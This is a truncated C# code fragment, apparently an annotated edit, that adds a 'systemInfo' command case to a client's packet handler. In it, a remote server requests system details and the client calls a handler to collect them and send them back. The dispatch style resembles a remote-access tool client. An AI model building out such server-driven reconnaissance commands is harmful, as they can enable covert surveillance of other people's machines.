...
using Client.Handle; // <-- ADDED: ensure this matches the namespace of your HandleSystemInfo class
using System;
        ...
        public static void Read(object data)
        {
            try
            {
                ...
                switch (unpack_msgpack.ForcePathObject("Packet").AsString)
                {
                    ...
                    // <-- NEW CASE: handle systemInfo request from server
                    case "systemInfo":
                        {
                            try
                            {
                                // Call the client handler that collects system info and sends it back.
                                // This method name assumes you implemented: HandleSystemInfo.OnRequest(MsgPack)
                                HandleSystemInfo.OnRequest(unpack_msgpack);
                            }
                            catch (Exception ex)
                            {
                                Error(ex.Message);
